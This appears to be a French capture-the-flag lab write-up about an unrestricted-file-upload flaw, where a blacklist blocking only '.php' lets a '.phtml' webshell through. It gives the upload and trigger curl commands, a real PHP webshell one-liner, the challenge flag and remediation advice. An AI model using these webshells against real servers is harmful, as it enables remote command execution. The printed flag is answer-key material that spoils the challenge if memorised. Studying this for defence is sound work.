# Recrutement — Upload Non Filtré (Unrestricted File Upload → RCE)

**Catégorie :** Web - RCE
**Difficulté :** Avancée
**Points :** 350

## Objectif

Obtenir l'exécution de commandes sur le serveur via le formulaire d'upload de CV, puis lire un fichier flag protégé.

## Vulnérabilité

Le formulaire d'upload bloque explicitement l'extension `.php`, mais utilise une logique de liste noire incomplète :

```python
if ext == ".php":
    message = "Extension .php interdite."
else:
    # accepte TOUT le reste, y compris .phtml, .php5, .pht
    file.save(...)
```

De plus, la route qui sert les fichiers uploadés simule un comportement serveur mal configuré (type Apache avec `AddHandler` trop permissif) qui exécute certaines extensions alternatives comme du code côté serveur :

```python
if filename.endswith((".phtml", ".php5", ".pht")):
    # exécution du contenu via un pseudo-interpréteur <?cmd ... ?>
```

C'est un cas réaliste : de nombreux serveurs Apache historiquement mal configurés exécutent plusieurs extensions comme PHP (`.phtml`, `.php3/4/5`, `.pht`) en plus de `.php`, ce qu'une liste noire bloquant uniquement `.php` ne couvre pas.

## Exploitation

**1. Création d'un webshell minimaliste**

```bash
cat > shell.phtml << 'EOF'
<?cmd cat /flag.txt ?>
EOF
```

**2. Upload du fichier malveillant**

```bash
curl -X POST http://<cible>:5005/ -F "cv=@shell.phtml"
# CV reçu : a1b2c3d4-....phtml
```

Le filtre vérifie uniquement l'extension `.php` exacte — `.phtml` passe sans problème.

**3. Déclenchement de l'exécution**

```bash
curl http://<cible>:5005/uploads/a1b2c3d4-....phtml
```

Le serveur lit le fichier, extrait la commande entre les balises `<?cmd ... ?>`, et l'exécute via `subprocess`, retournant la sortie.

## Résultat

```
FLAG{unr3str1ct3d_up10ad_rce_w3bsh3ll}
```

## Point pédagogique

Cette chaîne illustre deux erreurs combinées :
1. **Filtrage par liste noire incomplète** — bloquer une seule extension connue (`.php`) sans considérer ses variantes.
2. **Mauvaise configuration du serveur de fichiers statiques** — exécuter du contenu uploadé au lieu de le servir en tant que fichier statique brut.

Dans ce lab, l'exécution est simulée par Flask avec une syntaxe `<?cmd ?>` maison (au lieu d'un vrai interpréteur PHP) pour rester dans un stack Python pur — mais le principe est identique à un vrai webshell PHP (`<?php system($_GET['cmd']); ?>`) sur un serveur Apache/Nginx+PHP-FPM mal configuré.

## Flag

```
FLAG{unr3str1ct3d_up10ad_rce_w3bsh3ll}
```

## Remédiation

- **Liste blanche stricte** d'extensions autorisées (`.pdf`, `.docx` uniquement), rejet de tout le reste par défaut — jamais l'inverse.
- **Vérification du contenu réel** du fichier (magic bytes / libmagic), pas seulement de l'extension déclarée par le client.
- **Stockage hors racine web**, avec des noms de fichiers générés aléatoirement et sans extension exécutable possible.
- **Désactiver l'exécution de scripts** dans le dossier d'upload au niveau de la configuration serveur (ex: `php_admin_flag engine off` dans un `.htaccess` dédié, ou un dossier non couvert par le handler PHP).
- Isoler le service de traitement des fichiers uploadés (scan antivirus, sandboxing) avant tout traitement.
